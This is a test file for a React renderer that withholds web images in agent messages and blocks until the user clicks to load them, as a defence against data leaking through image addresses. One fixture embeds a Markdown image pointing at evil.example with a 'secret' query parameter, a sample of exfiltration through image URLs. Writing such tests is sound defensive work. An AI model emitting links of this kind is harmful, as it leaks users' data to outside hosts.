// @vitest-environment happy-dom
// Images on the web aren't fetched until the user asks: what names one is often an agent's (a message, a file it wrote,
// a block), and its address can carry what the agent read. Until then each says where it's from, to click; a click
// loads it, and the other web images of the same message with it. Files and data: images show as ever.
import { act, createElement as h } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, expect, it } from 'vitest'
import type { MachineEntry } from '../src/shared/bridge.ts'
import { Images, imagesIn, Markdown } from '../src/renderer/Markdown.tsx'
import { Blocks } from '../src/renderer/blocks/blocks.tsx'
import { imageReadAlready, imageSourceOf, loadWebImages } from '../src/renderer/images.tsx'

;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true
// Every image is near the screen (happy-dom's observer never says so).
delete (globalThis as { IntersectionObserver?: unknown }).IntersectionObserver

const machine: MachineEntry = { id: 'm', label: 'm', state: 'connected', features: ['image-read'], extensions: [] }
const DOT = 'data:image/gif;base64,R0lGODlhAQABAAAAACw='
let root: Root | undefined
let container: HTMLElement
afterEach(async () => { await act(async () => root?.unmount()); root = undefined; container?.remove() })

async function draw(node: ReturnType<typeof h>) {
  container = document.body.appendChild(document.createElement('div'))
  root = createRoot(container)
  await act(async () => root!.render(node))
  // Images read as they come near the screen: let that settle.
  await act(async () => { await new Promise((resolve) => setTimeout(resolve, 0)) })
}
const sources = () => [...container.querySelectorAll('img')].map((img) => img.getAttribute('src'))
const loadButtons = () => [...container.querySelectorAll('button')].filter((b) => b.textContent?.startsWith('Load image'))

it("holds a message's web images until one is clicked, then loads them all; a data: image shows at once", async () => {
  const text = `![chart](https://evil.example/a.png?d=secret) and ![other](https://cdn.example/b.png)\n\n![dot](${DOT})`
  await draw(h(Images.Provider, { value: imagesIn(machine, 't') }, h(Markdown, { text })))
  expect(sources()).toEqual([DOT])
  const [first] = loadButtons()
  expect(loadButtons()).toHaveLength(2)
  expect(first!.textContent).toContain('evil.example')
  expect(first!.getAttribute('aria-label')).toBe('Load chart from evil.example')
  await act(async () => { first!.click() })
  await act(async () => { await new Promise((resolve) => setTimeout(resolve, 0)) })
  expect(sources().sort()).toEqual([DOT, 'https://cdn.example/b.png', 'https://evil.example/a.png?d=secret'].sort())
  expect(loadButtons()).toHaveLength(0)
})

it('holds a web image in Markdown drawn outside a thread too', async () => {
  await draw(h(Markdown, { text: '![x](https://elsewhere.example/x.png)' }))
  expect(sources()).toEqual([])
  await act(async () => { loadButtons()[0]!.click() })
  expect(sources()).toEqual(['https://elsewhere.example/x.png'])
})

it("holds an agent's image block on the web until it's clicked", async () => {
  await draw(h(Blocks, { machine, blocks: [{ type: 'image', src: 'https://block.example/i.png', alt: 'plot' }], host: { by: 'agent' } }))
  expect(sources()).toEqual([])
  expect(loadButtons()[0]!.getAttribute('aria-label')).toBe('Load plot from block.example')
  await act(async () => { loadButtons()[0]!.click() })
  await act(async () => { await new Promise((resolve) => setTimeout(resolve, 0)) })
  expect(sources()).toEqual(['https://block.example/i.png'])
})

it('gives no address for a web image not asked for, wherever it is read (the lightbox, its neighbours)', async () => {
  const image = { name: 'x', url: 'https://read.example/x.png' }
  expect(imageReadAlready(machine, 't', image, 'whole')).toBeUndefined()
  await expect(imageSourceOf(machine, 't', image, 'whole')).rejects.toThrow(/Not loaded/)
  loadWebImages([image.url])
  expect(imageReadAlready(machine, 't', image, 'whole')).toBe(image.url)
  await expect(imageSourceOf(machine, 't', image, 'whole')).resolves.toBe(image.url)
})
